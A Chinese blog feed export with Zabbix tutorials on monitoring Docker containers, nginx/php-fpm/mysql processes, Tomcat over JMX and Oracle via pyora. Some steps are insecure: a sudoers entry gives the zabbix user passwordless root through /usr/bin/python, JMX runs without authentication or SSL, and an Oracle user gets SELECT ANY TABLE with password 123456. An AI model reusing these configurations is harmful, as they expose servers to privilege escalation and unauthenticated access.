    <content type="text"><![CDATA[zabbix自动发现实现批量监控docker状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最近在搞zabbix监控docker以及docker内部应用状态信息，网上找的资料好少，只找到了一个大神的一篇文章，用的是python实现监控docker容器的基本状态，在他给的脚本基础上进行修改，另外，增加了docker内部常用应用的状态监控，目前在测试环境上部署成功了，具体还需要在线上环境部署后才能检验出效果如何。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，介绍下该监控套件有三个脚本，一个是自动发现主机上的docker容器脚本，另一个是用python写的获取每个docker容器的系统状态，包括CPU使用率，内存使用率以及网络资源使用率，最后这个脚本添加了一些我公司常用的应用的状态监控，包括应用占用内存，cpu资源以及进程的存活状态，至于读者们需要监控其他docker里面的应用，可以依照我的脚本来进行修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，需要编辑自动发现docker中容器个数的脚本，内容如下： 1234567891011121314151617181920212223242526272829303132cat /usr/local/zabbix/scripts/docker_low_discovery.sh #!/bin/bash#Fucation:docker low-level discoverydocker() &#123; port=($(sudo docker ps -a|grep -v "CONTAINER ID"|awk '&#123;print $NF&#125;')) printf '&#123;\n' printf '\t"data":[\n' for key in $&#123;!port[@]&#125; do if [[ "$&#123;#port[@]&#125;" -gt 1 &amp;&amp; "$&#123;key&#125;" -ne "$(($&#123;#port[@]&#125;-1))" ]];then printf '\t &#123;\n' printf "\t\t\t\"&#123;#CONTAINERNAME&#125;\":\"$&#123;port[$&#123;key&#125;]&#125;\"&#125;,\n" else [[ "$&#123;key&#125;" -eq "(($&#123;#port[@]&#125;-1))" ]] printf '\t &#123;\n' printf "\t\t\t\"&#123;#CONTAINERNAME&#125;\":\"$&#123;port[$&#123;key&#125;]&#125;\"&#125;\n" fi done printf '\t ]\n' printf '&#125;\n'&#125;case $1 indocker)docker;;*)echo "Usage:`basename $0` &#123;docker&#125;";;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面这个脚本是用来获取到docker里面应用的容器，并对其进行json化输出的，效果如下： 123456789sh /usr/local/zabbix/scripts/docker_low_discovery.sh docker&#123;"data":[ &#123;"&#123;#CONTAINERNAME&#125;":"hopeful_brown"&#125;, &#123;"&#123;#CONTAINERNAME&#125;":"happy_einstein"&#125; ]&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就能被zabbix_server获取到了，然后是python脚本,使用python获取docker的参数需要使用一个扩展包，可以通过pip或者easy_install安装docker-py扩展： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pip install docker-py或者easy_install docker-py或者不想这样安装的话可以去 python官网下载docker-py的安装包，解压后使用docker docker-py-1.4.0/setup.py install命令安装，扩展包我将会打包放在附件中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是python脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344cat /usr/local/zabbix/scripts/docker_monitor.py #!/usr/bin/env python#-*- coding: utf-8 -*-#author:Xianglin Hu#email: a714585725@qq.comfrom docker import Clientimport sysimport subprocessimport os def check_container_stats(container_name,collect_item): container_collect=docker_client.stats(container_name) old_result=eval(container_collect.next()) new_result=eval(container_collect.next()) container_collect.close() if collect_item == 'cpu_total_usage': result=new_result['cpu_stats']['cpu_usage']['total_usage'] - old_result['cpu_stats']['cpu_usage']['total_usage'] elif collect_item == 'cpu_system_usage': result=new_result['cpu_stats']['system_cpu_usage'] - old_result['cpu_stats']['system_cpu_usage'] elif collect_item == 'cpu_percent': cpu_total_usage=new_result['cpu_stats']['cpu_usage']['total_usage'] - old_result['cpu_stats']['cpu_usage']['total_usage'] cpu_system_uasge=new_result['cpu_stats']['system_cpu_usage'] - old_result['cpu_stats']['system_cpu_usage'] cpu_num=len(old_result['cpu_stats']['cpu_usage']['percpu_usage']) result=round((float(cpu_total_usage)/float(cpu_system_uasge))*cpu_num*100.0,2) elif collect_item == 'mem_usage': result=new_result['memory_stats']['usage'] elif collect_item == 'mem_limit': result=new_result['memory_stats']['limit'] elif collect_item == 'mem_percent': mem_usage=new_result['memory_stats']['usage'] mem_limit=new_result['memory_stats']['limit'] result=round(float(mem_usage)/float(mem_limit)*100.0,2) elif collect_item == 'network_rx_bytes': network_check_command="""sudo /usr/bin/docker exec %s cat /proc/net/dev|sed -n 3p|awk '&#123;print $2,$10&#125;'"""%container_name result=os.popen(network_check_command).read().split()[0] elif collect_item == 'network_tx_bytes': network_check_command="""sudo /usr/bin/docker exec %s cat /proc/net/dev|sed -n 3p|awk '&#123;print $2,$10&#125;'"""%container_name result=os.popen(network_check_command).read().split()[1] return resultif __name__ == "__main__": docker_client = Client(base_url='unix://var/run/docker.sock', version='1.17') container_name=sys.argv[1] collect_item=sys.argv[2] print check_container_stats(container_name,collect_item) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里面使用到了docker里面的Client类，获取到某个docker容器的当前状态信息，然后进行运算，返回运算结果。但是容器当前信息那个dict中的network的key获取到的信息不准确，于是我使用了docker exec命令来获取docker容器内部的网络流量信息。这也是在大神的基础上进行改进的地方，这里的改进将python脚本的执行时间缩短了，将有助于server获取duocker容器信息时减少长连接的数量，提升zabbix_server的性能。这里的docker exec命令将会在下一个脚本中大量使用来获取docker容器中的应用状态信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是获取容器应用状态信息的脚本： 1234567891011121314151617181920212223242526272829cat docker_processmonitor.sh #!/bin/bash#license:GPL#mail:a714585725@qq.com#date:2015.09.22processmem()&#123; sudo /usr/bin/docker exec $1 ps aux|grep $2|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;processcpu()&#123; sudo /usr/bin/docker exec $1 ps aux|grep $2|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;processport()&#123; sudo /usr/bin/docker exec $1 ss -antlp|grep $2|grep LISTEN|wc -l&#125;case "$3" inmem)processmem $1 $2;;cpu)processcpu $1 $2;;port)processport $1 $2;;*)echo "Usage: $0 &#123;docker_containername&#125;&#123;processname&#125;&#123;mem|cpu|port&#125;";;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个脚本使用了一个case来判断需要获取的docker容器的名称以及该容器中应用的状态信息，只不过这里获取docker容器状态信息使用的是docker exec命令来进行获取。另外这里面添加了对于应用是否存活的状态监测，那就是检测该应用是否侦听了网络端口，假如该应用侦听的网络端口个数为0的话，可以认为该应用存在异常。可以根据自己需求修改相应应用的监控。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于docker是以root权限来启用的，而zabbix监控是使用zabbix用户来执行的，所以需要给予zabbix用户相应的权限，需要编辑visudo： 1echo "zabbix ALL=(root) NOPASSWD:/bin/docker,/usr/bin/python,/usr/local/zabbix/scripts/docker_monitor.py,/usr/local/zabbix/scripts/docker_low_discovery.sh,/usr/local/zabbix/scripts/docker_processmonitor.sh"&gt;&gt;/etc/sudoers &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;并且还需要注释掉这条记录：#Defaults requiretty（PS：注意，这条记录是要求使用sudo命令时需要有终端界面，注释掉这一条之后就可以不需要终端执行sudo命令了。） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后就是编辑zabbix_agentd.conf文件,添加下面几行： 12345tail -3 /usr/local/zabbix/etc/zabbix_agentd.confUserParameter=docker_low_discovery[*],/bin/bash /usr/local/zabbix/scripts/docker_low_discovery.sh $1UserParameter=docker_stats[*],sudo /usr/bin/python /usr/local/zabbix/scripts/docker_monitor.py $1 $2UserParameter=docker_process[*],/bin/bash /usr/local/zabbix/scripts/docker_processmonitor.sh $1 $2 $3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置并重启zabbix_agentd服务，然后修改脚本的属主属组以及权限： 12chown zabbix.zabbix /usr/local/zabbix/scripts/*chmod 755 /usr/local/zabbix/scripts/* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后可以在zabbix_server端测试是否能够获取到相应的数据： 12345678910111213[root@test1 ~]# /usr/local/zabbix-2.4.4/bin/zabbix_get -s x.x.x.x -k"docker_low_discovery[docker]"&#123;"data":[ &#123;"&#123;#CONTAINERNAME&#125;":"hopeful_brown"&#125;, &#123;"&#123;#CONTAINERNAME&#125;":"happy_einstein"&#125; ]&#125;[root@test1 ~]# /usr/local/zabbix-2.4.4/bin/zabbix_get -s x.x.x.x -k"docker_stats[happy_einstein,network_tx_bytes]"9664252[root@test1 ~]# /usr/local/zabbix-2.4.4/bin/zabbix_get -s x.x.x.x -k"docker_process[happy_einstein,nginx,port]"2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的IP地址就用x.x.x.x代替了，这里应该填写客户端的IP地址。如上所示，能够正确获取到agentd的数据以后，然后就需要在zabbix_server这边配置监控模版了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面这些显示的是监控的结果，也可以根据自己的需求来进行修改]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix通过自定义脚本监控nginx，php-fpm和mysql占用内存数和进程的个数]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F25.%20zabbix%E9%80%9A%E8%BF%87%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E7%9B%91%E6%8E%A7nginx%EF%BC%8Cphp-fpm%E5%92%8Cmysql%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%95%B0%E5%92%8C%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%B8%AA%E6%95%B0%2F</url>
    <content type="text"><![CDATA[zabbix通过自定义脚本监控nginx，php-fpm和mysql占用内存数和进程的个数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix通过自定义脚本监控nginx，php-fpm和mysql占用内存数和进程的个数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，在zabbix脚本目录下添加一个脚本，写入如下代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/bin/bash#license:GPL#mail:admin@huxianglin.cn#date:2015.04.16top -bn1&gt;/usr/local/zabbix-2.4.4/scripts/process.logLOG=/usr/local/zabbix-2.4.4/scripts/process.logphp_fpm()&#123; grep "php-fpm" $LOG |awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;php_fpm_num()&#123; grep "php-fpm" $LOG |wc -l&#125;nginx()&#123; grep "nginx" $LOG |awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;nginx_num()&#123; grep "nginx" $LOG |wc -l&#125;mysqld()&#123; grep "mysqld" $LOG |awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;mysqld_num()&#123; grep "mysqld" $LOG |wc -l&#125;case "$1" inphp_fpm) php_fpm ;;php_fpm_num) php_fpm_num ;;nginx) nginx ;;nginx_num) nginx_num ;;mysqld) mysqld ;;mysqld_num) mysqld_num ;;*)echo "Usage: $0 &#123;php_fpm|php_fpm_num|nginx|nginx_num|mysqld|mysqld_num&#125;"esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存之后修改其属组和属主为zabbix.zabbix,然后新建一个文件process.log，同样设置属主和属组为zabbix.zabbix &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编辑zabbix_agentd.conf文件，在最后添加上下面这段代码，并重启zabbix_agentd服务 123456UserParameter=process.php_fpm,/usr/local/zabbix-2.4.4/scripts/processstatus.sh php_fpmUserParameter=process.php_fpm_num,/usr/local/zabbix-2.4.4/scripts/processstatus.sh php_fpm_numUserParameter=process.nginx,/usr/local/zabbix-2.4.4/scripts/processstatus.sh nginxUserParameter=process.nginx_num,/usr/local/zabbix-2.4.4/scripts/processstatus.sh nginx_numUserParameter=process.mysqld,/usr/local/zabbix-2.4.4/scripts/processstatus.sh mysqldUserParameter=process.mysqld_num,/usr/local/zabbix-2.4.4/scripts/processstatus.sh mysqld_num &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后就可以在web页面添加item，生成图表了，注意top取到的内存单位是KB，所以在定义item的时候需要自定义单位和设定倍数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成的各个程序占用内存大小的图形如下 生成的各个程序的进程个数图形如下，可以设定触发器，当进程满足触发其条件时发送报警]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix通过JMX监控tomcat状态]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F24.%20zabbix%E9%80%9A%E8%BF%87JMX%E7%9B%91%E6%8E%A7tomcat%E7%8A%B6%E6%80%81%2F</url>
    <content type="text"><![CDATA[zabbix通过JMX监控tomcat状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为大量使用tomcat作为应用服务，所以，这两天催生了一个想法，通过zabbix监控tomcat的运行状态，从而能够更快的发现tomcat服务出现的问题以及判断问题出现在哪块。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，zabbix监控tomcat等这一类java平台的应用不是直接通过agentd来实现的，而是使用jmx来获取到tomcat这类应用的状态，然后再将数据交给server端，生成监控图。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要用到jmx监控的话需要在客户端和服务端都安装java环境，至于java环境可以通过源码安装，不过我这里为了省事，直接通过yum安装java和java-devel这两个包： 1yum -y install java java-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后是服务端的配置： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务端需要重新安装zabbix服务端，需要将–enable-java添加到编译参数中去，参数如下所示： 1./configure --prefix=/usr/local/zabbix/ --enable-server --enable-agent --with-mysql --with-net-snmp --with-libcurl --with-libxml2 --enable-java &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装好服务端之后可以在软件安装目录找到如下这个目录： 1234[root@test1 zabbix_java]# pwd/usr/local/zabbix/sbin/zabbix_java[root@test1 zabbix_java]# lsbin lib settings.sh shutdown.sh startup.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改settings.sh中得参数，其中大部分都是以#开头的，修改的参数如下面所示： 12345[root@test1 zabbix_java]# egrep -v "^#|^$" settings.sh LISTEN_IP="0.0.0.0"LISTEN_PORT=10052PID_FILE="/tmp/zabbix_java.pid"START_POLLERS=5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改zabbix_server.conf的配置，修改的参数如下面所示： 123456789[root@test1 zabbix_java]# egrep -v "^#|^$" /usr/local/zabbix/etc/zabbix_server.confLogFile=/tmp/zabbix_server.logDBName=zabbixDBUser=zabbixDBPassword=xxxxxxDBSocket=/tmp/mysql.sockJavaGateway=127.0.0.1JavaGatewayPort=10052StartJavaPollers=5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中上面的5行和以前配置一样，下面的三行是需要将前面的#删掉，并进行修改的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改完以后，重启zabbixserver并且启动zabbix_java_Gateway启动 zabbix_java_Gateway的方法为 1sh /usr/local/zabbix/sbin/zabbix_java/startup.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动之后，在服务端会多出一个侦听端口10052来，效果如下： 123[root@test1 zabbix_java]# netstat -antlp|grep 10052tcp6 0 0 :::10052 :::* LISTEN 15371/java tcp6 0 0 127.0.0.1:10052 127.0.0.1:38661 TIME_WAIT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看到上面这些信息，证明服务端已经配置好了，接下来需要配置tomcat客户端了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat客户端的配置为如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先安装java环境 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也和上面一样使用yum安装： 1yum -y install java java-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后下载tomcat的源码包，解压后放在相应的目录，我这里放在/usrlocal/tomcat- 8.0.26/目录下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后需要下载对应tomcat的jmx版本，这里安装的是最新的tomcat,版本是8.0.26，于是下载路径为如下： 1wget http://archive.apache.org/dist/tomcat/tomcat- 8/v8.0.26/bin/extras/catalina-jmx-remote.jar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用其他版本的可以自行选择相对应的jmx版本下载。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载后将该文件放在tomcat的lib目录下，然后修改catalina.sh文件，catalina.sh文件在tomcat的bin目录下。在#!bin/sh下方添加一行参数，如下所示： 12#!/bin/shCATALINA_OPTS="-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=10.6.0.176" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中的10.6.0.176是该tomcat客户端的IP。然后需要修改服务器的配置文件server.xml： 123456[root@test3 tomcat-8.0.26]# tail -6 ./conf/server.xml&lt;Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="8090" rmiServerPortPlatform="8090" /&gt; &lt;/Host&gt; &lt;/Engine&gt; &lt;/Service&gt;&lt;/Server&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如上面所示，第一行就是我们添加进去的配置，其中的8090就是zabbix server端监控tomcat需要使用的端口。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存之后退出，然后启动tomcat和zabbix的agentd。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动完成之后通过ps命令和netstat命令查看是否正常的侦听了相应的端口，zabbix_agentd默认侦听10050端口，tomcat默认侦听8080端口，8090端口是开给jmx使用 的，应该也是开启的，效果如下： 12345678910[root@test3 tomcat-8.0.26]# netstat -antlp|grep LISTEN tcp 0 0 0.0.0.0:10050 0.0.0.0:* LISTEN 19592/./sbin/zabbix tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 836/sshd tcp6 0 0 ::1:25 :::* LISTEN 1503/master tcp6 0 0 :::8090 :::* LISTEN 21026/java tcp6 0 0 127.0.0.1:8005 :::* LISTEN 21026/java tcp6 0 0 :::8009 :::* LISTEN 21026/java tcp6 0 0 :::8080 :::* LISTEN 21026/java tcp6 0 0 :::40438 :::* LISTEN 21026/java tcp6 0 0 :::22 :::* LISTEN 836/sshd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候可以在zabbix_server端尝试获取tomcat的相关数据了。这时候需要使用到一个工具cmdline-jmxclient-0.10.3.jar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个工具可以自己到网上下载，我的附件中也会有这个工具，使用方法为如下： 123456[root@test1 zabbix_java]# java -jar /root/cmdline-jmxclient-0.10.3.jar - 10.6.0.176:8090 java.lang:type=Memory NonHeapMemoryUsage09/09/2015 17:56:49 +0800 org.archive.jmx.Client NonHeapMemoryUsage: committed: 24313856init: 24313856max: 224395264used: 20066808 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面已经获取到了相应的tomcat数据，好了，到这里配置就差不多要大功告成了，但是还需要在web端配置相应的模版，刚开始我使用系统自带的模板，发现出不来数据，于是我去网上找到了某个网友自己做的模板，终于可以获取到tomcat的数据了，模板我也将一并打包放在附件中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，在web端开始配置了，配置如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中的端口需要填写两个，第一个是agentd的侦听端口，第二个是jmx的侦听端口，这个端口8090是我们在tomcat客户端的server.xml文件中定义的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将该主机关联到相应的模板上去： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后就等待出数据了，该模板中的某些键值在tomcat中不支持，我目前还不知道是什么情况，可能和tomcat中得配置参数有关系吧。下面展示一下出图的效果，这个模板各位也可以拿回去自己进行修改：]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix使用pyora监控oracle数据库]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F23.%20zabbix%E4%BD%BF%E7%94%A8pyora%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[zabbix使用pyora监控oracle数据库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用Orabbix监控oracle数据库，发现可以实现对oracel数据库实行监控，但是 最近部署Orabbix监控oracle数据库，发现始终无法获取到数据库的内容。。。。。。由于Orabbix是基于java实现的，使用的是jdbc连接oracle数据库，获取到的值传递给zabbix捕捉器来捕捉，这个过程我不是很熟悉。。。。。。始终无法调试出图来。。。最后终于放弃，寻找Orabbix的替代品。在zabbix官网找了一遍，发现使用python实现的pyora这个脚本还不错，最大的优势就是能够自定义自己想监控的相关参数，只需要修改脚本，在里面添加相关函数就行。pyora是通过python使用python的一个组件cx_Oracle来获取的，获取到的数据传递给zabbix的agent，从而获取到相关监控数据，这种方式比较简单，也比较容易扩展。pyora的缺点就是本身提供的监控item比较少，而且提供的模板是一个半成品模板，需要自己根据需要设计相应的模板，从而达到监控的目的。总体来说，pyora的特点就是简单，开源，易扩展，但是整体做的不是很完整。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，需要下载pyora，在zabbix官网上面找到的github的链接，链接在这https://github.com/bicofino/Pyora &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而python需要安装cx_Oracle这个组件才能连接到数据库，安装cx_Oracle这个组件比较麻烦，搞了差不多两个多小时才搞定，开始使用源码安装，结果安装不上去。。。一直解决不了报错。。。于是去找了rpm包来安装，由于这里的oracle数据库的python版本是2.6的，所以下载了2.6对应的版本，并且这里支持的最新的oracle也只有11g，而我这里使用的是12c，当时还担心了好久，怕无法使用，后来证实11g的rpm包也是可以在12c的oracle数据库上面使用的，链接在这http://sourceforge.net/projects/cx-oracle/files/5.1.2/cx_Oracle-5.1.2-11g-py26-1.x86_64.rpm/download 可以根据自己的需要下载相应的rpm包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还需要下载两个python的组件，一个是argparse，还有一个是setuptools这两个包都是到Python官网下载的。首先安装setuptools，然后再安装argparse，安装方式是使用源码安装，解压后进入目录，使用python setup.py install就可以安装了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，前期准备工作做完了，接下来就需要安装cx_Oracle了，首先，在root用户下 的.bashrc中添加oracle的环境变量，否则将导致无法使用cx_Oracle模块，下面是在用 户中添加的环境变量： 1234567tail -6 .bashrc # User specific aliases and functionsexport ORACLE_HOME=/u01/app/oracle/product/12.1.0.2/dbhomeexport TNS_ADMIN=$ORACLE_HOME/network/adminexport PATH=$PATH:$ORACLE_HOME/bin:$ORACLE_HOME/lib:/lib:/usr/lib:$ORACLE_HOME/rdbms/libexport LD_LIBRARY_PATH=$ORACLE_HOME/lib:/lib:/usr/lib:$ORACLE_HOME/rdbms/libexport CLASSPATH=$ORACLE_HOME/JRE:$ORACLE_HOME/jlib:$ORACLE_HOME/rdbms/jlib &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加好环境变量之后，需要使其立即生效，使用命令source .bashrc来使其生效，注意export PATH=$PATH:$ORACLE_HOME/bin:$ORACLE_HOME/lib:/lib:/usr/lib:$ORACLE_HOME/rdbms/lib这条命令，刚开始的时候没有添加后面的lib的环境变量，导致安装好cx_Oracle 组件之后还是无法import这个组件，报错信息如下： 1error while loading shared libraries: libclntsh.so.11.1: cannot open shared object file: No such file or directory &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后来，将环境变量中添加了lib库该报错就消失了。接下来就是安装cx_Oracle组建了，使用rpm -ivh cx_Oracle-5.1.2-11g-py26-1.x86_64.rpm就可以安装了，安装好后使用下面的操作看是否能够正常的import，下面是我的操作步骤，如果你的和我的一样没有异常输出，那么就没问题的： 123456pythonPython 2.6.6 (r266:84292, Jan 22 2014, 01:49:05) [GCC 4.4.7 20120313 (Red Hat 4.4.7-4)] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import cx_Oracle&gt;&gt;&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装好后就可以使用pyora脚本来获取值了，（PS:对了，在这之前，需要在oracle数据库中创建相应的监控用户）关于oracle数据库中添加相应的监控用户权限属于DBA的范畴了，我这里只会贴出一些参考的权限配置，相关配置各位可以和公司的DBA协商配置： 123456789CREATE USER ZABBIX IDENTIFIED BY 123456 DEFAULT TABLESPACE USERS TEMPORARY TABLESPACE TEMP; GRANT CONNECT TO ZABBIX; GRANT RESOURCE TO ZABBIX; ALTER USER ZABBIX DEFAULT ROLE ALL; GRANT SELECT ANY TABLE TO ZABBIX; GRANT CREATE SESSION TO ZABBIX; GRANT SELECT ANY DICTIONARY TO ZABBIX; GRANT UNLIMITED TABLESPACE TO ZABBIX; GRANT SELECT ANY DICTIONARY TO ZABBIX; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置好环境后就可以使用pyora脚本实现监控oracle了，接下来需要执行pyora脚本来进行测试了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在下载的pyora压缩包中含有pyora.py脚本，将其上传至客户端服务器，然后使用python pyora.py –username zabbix –password 123456 –address 127.0.0.1 –database xxx show_users来测试是否能够获取到正常数据，下面是执行的结果： 1&#123;"data": [&#123;"&#123;#DBUSER&#125;": "ANONYMOUS"&#125;, &#123;"&#123;#DBUSER&#125;": "APPQOSSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "ASYNC"&#125;, &#123;"&#123;#DBUSER&#125;": "AUDSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "DBSNMP"&#125;, &#123;"&#123;#DBUSER&#125;": "DIP"&#125;, &#123;"&#123;#DBUSER&#125;": "GSMADMIN_INTERNAL"&#125;, &#123;"&#123;#DBUSER&#125;": "GSMCATUSER"&#125;, &#123;"&#123;#DBUSER&#125;": "GSMUSER"&#125;, &#123;"&#123;#DBUSER&#125;": "OJVMSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "ORACLE_OCM"&#125;, &#123;"&#123;#DBUSER&#125;": "OUTLN"&#125;, &#123;"&#123;#DBUSER&#125;": "SYNC"&#125;, &#123;"&#123;#DBUSER&#125;": "SYS"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSBACKUP"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSDG"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSKM"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSTEM"&#125;, &#123;"&#123;#DBUSER&#125;": "WMSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "XDB"&#125;, &#123;"&#123;#DBUSER&#125;": "XS$NULL"&#125;, &#123;"&#123;#DBUSER&#125;": "ZABBIX"&#125;]&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;获取的是json格式的数据，证明这个脚本是可以正常运行的，然后需要创建zabbix用户，然后再安装agnetd，然后修改zabbix用户的环境变量，编辑zabbix用户家目录下的.bashrc将上面的环境变量添加进去并source .bashrc使环境变量生效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后再使用zabbix用户重复一次执行上面的获取数据的步骤，测试能够获取数据的话就说明没问题了，在agentd的配置文件中写入如下配置，以执行这个脚本获取到监控的数据： 12tail -2 /home/zabbix/zabbix/etc/zabbix_agentd.confUserParameter=pyora[*],/usr/bin/python /home/zabbix/zabbix/scripts/pyora.py --username $1 --password $2 --address $3 --database $4 $5 $6 $7 $8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后重启agentd，然后再在server端使用zabbix_get测试能否获取到数据，测试结果如下： 12/opt/software/zabbix/bin/zabbix_get -s xx.xx.xx.xx -k"pyora[zabbix,123456,127.0.0.1,xxx,show_users]"&#123;"data": [&#123;"&#123;#DBUSER&#125;": "ANONYMOUS"&#125;, &#123;"&#123;#DBUSER&#125;": "APPQOSSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "ASYNC"&#125;, &#123;"&#123;#DBUSER&#125;": "AUDSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "DBSNMP"&#125;, &#123;"&#123;#DBUSER&#125;": "DIP"&#125;, &#123;"&#123;#DBUSER&#125;": "GSMADMIN_INTERNAL"&#125;, &#123;"&#123;#DBUSER&#125;": "GSMCATUSER"&#125;, &#123;"&#123;#DBUSER&#125;": "GSMUSER"&#125;, &#123;"&#123;#DBUSER&#125;": "OJVMSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "ORACLE_OCM"&#125;, &#123;"&#123;#DBUSER&#125;": "OUTLN"&#125;, &#123;"&#123;#DBUSER&#125;": "SYNC"&#125;, &#123;"&#123;#DBUSER&#125;": "SYS"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSBACKUP"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSDG"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSKM"&#125;, &#123;"&#123;#DBUSER&#125;": "SYSTEM"&#125;, &#123;"&#123;#DBUSER&#125;": "WMSYS"&#125;, &#123;"&#123;#DBUSER&#125;": "XDB"&#125;, &#123;"&#123;#DBUSER&#125;": "XS$NULL"&#125;, &#123;"&#123;#DBUSER&#125;": "ZABBIX"&#125;]&#125; 